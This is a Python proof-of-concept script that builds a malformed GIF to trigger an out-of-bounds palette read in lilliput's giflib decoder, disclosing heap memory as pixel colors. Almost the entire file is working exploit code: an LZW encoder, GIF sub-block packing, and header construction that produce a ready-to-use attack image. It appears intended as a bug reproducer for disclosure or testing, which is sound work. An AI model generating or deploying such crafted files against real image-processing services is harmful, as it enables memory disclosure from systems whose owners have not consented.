#!/usr/bin/env python3
"""
Minimal reproducer: GIF Palette Index Out-of-Bounds Read in lilliput giflib.cpp

Creates a valid GIF89a file with:
  - Global color table of only 2 entries (2 colors = ColorCount=2)
  - Image data where pixel indices are 0xC8 (200), which is well beyond ColorCount

When processed by lilliput's giflib_decoder_render_frame(), accessing
colorMap->Colors[200] will read 198 entries past the end of a 2-entry palette array,
disclosing heap memory as pixel color values in the output image.

Usage:
    python3 craft_gif_palette_oob.py > poc.gif
    # or: python3 craft_gif_palette_oob.py poc.gif
"""

import struct
import sys

def lzw_compress_minimal(indices, min_code_size):
    """
    Minimal LZW encoder that outputs the raw pixel indices as literal codes,
    bypassing the normal dictionary building. Enough to fool giflib into
    decompressing to the desired palette indices.
    
    We abuse the fact that we can emit the indices as raw LZW symbols.
    For a min_code_size of 2 (required for 2-color palette), we encode
    each pixel index directly as a literal code word, then wrap in GIF
    sub-blocks.
    
    NOTE: This uses a real LZW encoder to guarantee giflib accepts it.
    """
    clear_code = 1 << min_code_size
    eoi_code = clear_code + 1
    
    # Build code table
    code_table = {(i,): i for i in range(clear_code)}
    next_code = eoi_code + 1
    code_size = min_code_size + 1
    
    output_bits = []
    
    def emit(code):
        for i in range(code_size):
            output_bits.append((code >> i) & 1)
    
    # Emit clear code
    emit(clear_code)
    
    buffer = ()
    for idx in indices:
        extended = buffer + (idx,)
        if extended in code_table:
            buffer = extended
        else:
            emit(code_table[buffer])
            if next_code < 4096:
                code_table[extended] = next_code
                next_code += 1
                if next_code > (1 << code_size) and code_size < 12:
                    code_size += 1
            buffer = (idx,)
    
    if buffer:
        emit(code_table[buffer])
    emit(eoi_code)
    
    # Pack bits into bytes (LSB first)
    result = bytearray()
    i = 0
    while i < len(output_bits):
        byte = 0
        for j in range(8):
            if i + j < len(output_bits):
                byte |= output_bits[i + j] << j
        result.append(byte)
        i += 8
    
    return bytes(result)


def pack_gif_subblocks(data):
    """Pack compressed data into GIF sub-blocks (max 255 bytes each)."""
    result = bytearray()
    i = 0
    while i < len(data):
        chunk = data[i:i+255]
        result.append(len(chunk))
        result.extend(chunk)
        i += 255
    result.append(0)  # Block terminator
    return bytes(result)


def make_poc_gif(width=16, height=16, oob_index=200):
    """
    Craft a GIF where pixel data contains palette indices >= ColorCount (2).
    
    The global color table will have 2 entries (indices 0 and 1 are valid).
    Pixel data will use index `oob_index` (default: 200).
    
    In lilliput's giflib_decoder_render_frame(), this causes:
        colorMap->Colors[200]  (where ColorCount == 2)
    which is an out-of-bounds heap read.
    """
    out = bytearray()
    
    # GIF Header
    out += b'GIF89a'
    
    # Logical Screen Descriptor
    # Width, Height
    out += struct.pack('<HH', width, height)
    
    # Packed field:
    #   bit 7 (Global Color Table Flag) = 1
    #   bits 4-6 (Color Resolution - 1) = 0b010 (3-bit depth, so 8 colors max)
    #   bit 3 (Sort Flag) = 0
    #   bits 0-2 (Size of Global Color Table) = 0b000 -> 2^(0+1) = 2 entries
    packed = 0b10010000  # GCT present, 2^(1) = 2 entries
    out += struct.pack('B', packed)
    
    # Background Color Index = 0
    out += struct.pack('B', 0)
    # Pixel Aspect Ratio = 0
    out += struct.pack('B', 0)
    
    # Global Color Table: 2 entries (red, green)
    # Entry 0: red
    out += bytes([0xFF, 0x00, 0x00])
    # Entry 1: green  
    out += bytes([0x00, 0xFF, 0x00])
    
    # Graphic Control Extension (optional but makes a clean frame)
    out += bytes([
        0x21, 0xF9,  # Extension Introducer + Graphic Control Label
        0x04,        # Block size
        0x00,        # Packed: disposal=0, no user input, no transparent
        0x0A, 0x00,  # Delay: 10 centiseconds
        0x00,        # Transparent color index (none)
        0x00,        # Block terminator
    ])
    
    # Image Descriptor
    out += bytes([0x2C])  # Image Separator
    out += struct.pack('<HHHH', 0, 0, width, height)  # Left, Top, Width, Height
    # Packed: no local color table, not interlaced
    out += bytes([0x00])
    
    # Image Data
    # LZW minimum code size — must be large enough to encode oob_index as
    # a literal symbol.  With lzw_min=8 the initial code table holds indices
    # 0-255, so index 200 is a valid literal.  The GCT only has 2 entries,
    # but the GIF spec allows the LZW min code size to be larger than what
    # the palette requires.  giflib will happily decompress the stream and
    # hand index 200 to the renderer, which then does the OOB read.
    lzw_min = max(2, (oob_index).bit_length())
    if lzw_min > 8:
        raise ValueError("oob_index too large for GIF LZW (max 255)")
    lzw_min = 8  # always use 8 so all byte-range indices are valid literals
    out += bytes([lzw_min])
    
    # Create pixel data: all pixels have index `oob_index` (e.g., 200)
    # This is WELL beyond ColorCount=2
    pixel_data = [oob_index] * (width * height)
    compressed = lzw_compress_minimal(pixel_data, lzw_min)
    out += pack_gif_subblocks(compressed)
    
    # Trailer
    out += bytes([0x3B])
    
    return bytes(out)


if __name__ == '__main__':
    output_file = sys.argv[1] if len(sys.argv) > 1 else None
    
    gif_data = make_poc_gif(width=16, height=16, oob_index=200)
    
    if output_file:
        with open(output_file, 'wb') as f:
            f.write(gif_data)
        print(f"[+] Wrote {len(gif_data)} bytes to {output_file}")
        print(f"[+] GIF has 2-entry global color table, pixels use index 200")
        print(f"[+] lilliput will read colorMap->Colors[200] — 198 entries OOB")
    else:
        sys.stdout.buffer.write(gif_data)
